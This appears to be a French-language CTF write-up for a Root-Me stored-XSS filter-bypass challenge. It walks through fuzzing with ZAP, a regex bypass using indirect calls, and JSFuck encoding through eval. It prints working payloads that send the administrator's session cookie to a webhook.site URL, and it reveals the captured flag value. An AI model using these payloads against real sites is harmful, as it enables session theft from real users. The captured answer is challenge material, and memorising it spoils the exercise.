https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stored-contournement-de-filtres?lang=fr

XSS - Stored - Contournement de filtres
80 points

Contexte : on arrive sur une page de forum lambda qui comme tout les exercices nous donne comme seul énoncé de voler le cookie de session de l'administrateur. 

Première tentative : 
Comme pour l'ancien exercice que nous avons eu à faire sur les injections XSS, notre première approche a été de tester d'insérer directement une image avec comme src le lien d'un webhook où l'on concaténerait les cookies de l'administrateur qui lira le message.
```html
<img src=document.location='https://webhook.site/a7cc0ca2-549a-4d83-bf5a-ad7b02c359e7?cookie='.concat(document.cookie)>
```

Sans grande conviction, la tentative fût un échec, et nous nous sommes vu nous faire redirigé vers une page.
![Pasted image 20260301233953.png](assets/Pasted%20image%2020260301233953.png)
On comprend tout de suite, le sens derrière le titre de l'exercice après s'être renseigner sur internet et les diverses sources de cours fournis par root-me.org, on apprend l'existence de divers filtres et de manière de les contourner :
https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/
https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
```html
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<a onmouseover="alert(document.cookie)">xxs link</a>
...
```
Non loin l'envie de tous les tester un à un la liste est grande et pour les quelques-uns que nous testons à la main, le résultat est le même "Hacker Detected !".

Il nous faut un moyen de savoir s'il s'agit de balise particulière qui est bloquée, d'attribut, ou peut être même d'expression régulière particulière. C'est alors qu'on apprend l'existence de "Fuzzer" ou "Fuzz Testing". Et d'outils tels que ZAP qui permette parmi tant d'autres type d'attaquer de brute-force les paramètres d'une requête GET.

C'est alors qu'on tombe sur un forum PortSwigger, qui en plus de fourni une grande liste de payload pour "Filter Bypass", il fournit aussi une liste rapide à copier coller de chaque tag utile pour contourner des filtres.
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
Test des payloads sur ZAP : 

![Pasted image 20260301234608.png](assets/Pasted%20image%2020260301234608.png)
![Pasted image 20260301234636.png](assets/Pasted%20image%2020260301234636.png)
![Pasted image 20260301234703.png](assets/Pasted%20image%2020260301234703.png)
![Pasted image 20260301234755.png](assets/Pasted%20image%2020260301234755.png)
![Pasted image 20260301234807.png](assets/Pasted%20image%2020260301234807.png)

![Pasted image 20260301234846.png](assets/Pasted%20image%2020260301234846.png)
Après avoir lancé l'exécution en brute force sur les payload fourni par PortSwigger, nous obtenons un résultat peu probant. Aucun des payload n'est passé, on remarque cela notamment grâce à la colonne Taille du corps de la réponse qui vaut 16 octets pour tous sauf pour notre message originel qui avec comme corps "A". 16 octets équivalents bien évidemment au message "Hacker Detected!" de taille 16 :).

Bon passons maintenant au test des balises. Après une rapide modification des tags fournis par PortSwigger (rajoute des  avant et après chaque tag); On obtient un résultat plus intéressant :
A part quelques balises très utilisés pour contourner des filtres : 
![Pasted image 20260301235756.png](assets/Pasted%20image%2020260301235756.png)
On obtient ceci-dit aussi une grande liste de balise qui ne se fait pas détecter : 
![Pasted image 20260301235903.png](assets/Pasted%20image%2020260301235903.png)
Dont quelques un en particulier qui attire plus l'attention, la balise button et la balise a par exemple, qui sont des balises où il est possible d'interagir avec.

Bon le problème est que maintenant contrairement à une image qui se charge au chargement de la page et donc réalise forcément l'action au démarrage de la page. Rien ne saute à l'œil pour obtenir le même fonctionnement avec un bouton ou une balise d'ancre, qui tout deux nécessite d'être actionné pour effectuer quoi que ce soit.

Testons tous les attributs fourni par la liste PortSwigger sur la balise button, après le formatage suivant : 
```
<button 'attribute'>
```
On obtient de ZAP le résultat suivant : 
Aucun des attributs ne se fait flag par les filtres.
On essaye à nouveau avec un autre formatage. 
```
<button 'attribute'=x>
```
Même résultat, nous avons champs libre pour trouver un attribut permettant d'automatiquement réaliser une action au chargement de la page.

Après quelques recherche le premier attribut présentés par developer.mozilla.org pour la balise `<button>` n'est autre que "autofocus". L'attribut est parfait mis en corrélation avec onfocus, au rechargement de la page le boutton réalisera automatiquement une action.

https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/button

PS : Par la suite nous avons découvert qu'en réalité autofocus et onfocus sont des attributs qui fonctionnent pour la grande majorité des balises HTML

Petit soucis : 
```html
<button onfocus=alert(1) autofocus>
```
Se fait flag aussi, mais pas : 
```html
<button onfocus=alert autofocus>
```
il doit donc s'agir de l'expression régulière `[a-zA-Z]+\(`. Cependant si on connaît un peu le javascript on sait que chacune des fonctions représente en réalité des valeurs et qu'on peut ainsi réaliser des appels indirects de cette manière (func)(params).
```html
<button onfocus=(alert)(1) autofocus>
```
Et en effet, nous première injection JS fonctionne après tous ses essais. Mais ce n'est pas fini, il va falloir maintenant rediriger l'administrateur sur notre webhook.

```html
<button onfocus=(window.open)('https://webhook.site/a7cc0ca2-549a-4d83-bf5a-ad7b02c359e7?cookie='+document.cookie) autofocus>
```
L'exercice ne vaudrait pas autant de point, si après tout ces efforts un simple window.open suffirait.

Si l'on revient vers un des tout premiers liens fourni dans ce rapport : 
https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/

On retrouve différente manière d'écrire du JS en utilisant divers formatage, cependant une méthode particulière attire l'oeil plus que les autres ce qui est appelé le "JSFuck".
De la manière dont JS est codé il est possible d'écrire ce que l'on veut avec seulement les caractères `[]()!+`. Encore une bizarrerie permise par JS, mais ici cela va nous arranger

Si l'on regarde attentivement le fonctionnement de eval : fonction préconisé par https://jsfuck.com

https://developer.mozilla.org/fr/docs/Web/JavaScript/Reference/Global_Objects/eval

On voit :
![Pasted image 20260302002149.png](assets/Pasted%20image%2020260302002149.png)

C'est-à-dire exactement ce que l'on cherche à faire :
Allons donc convertir ce que l'on souhaite exécuter en JSFuck

```
document.location='https://webhook.site/a7cc0ca2-549a-4d83-bf5a-ad7b02c359e7?cookie='+document.cookie
```

Devient alors : 
```JSFuck
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![........
```

```HTML
<button autofocus onfocus=(eval)()></button>
```
Si on ajoute notre JSFuck comme paramètre d'eval, tout fonctionne lors de l'envoi de notre message dans le forum, on se fait rediriger vers notre webhook, il ne reste plus qu'à attendre le passage de l'administrateur :

![Pasted image 20260302002705.png](assets/Pasted%20image%2020260302002705.png)
Voilà notre mot de passe reçu directement sur le tableau de bord de notre webhook : 
`qa26f3ugb5tqv7o0mbvtv414u8`
(Le premier étant un cookie que l'on possédait déjà en tant qu'utilisateur lambda)
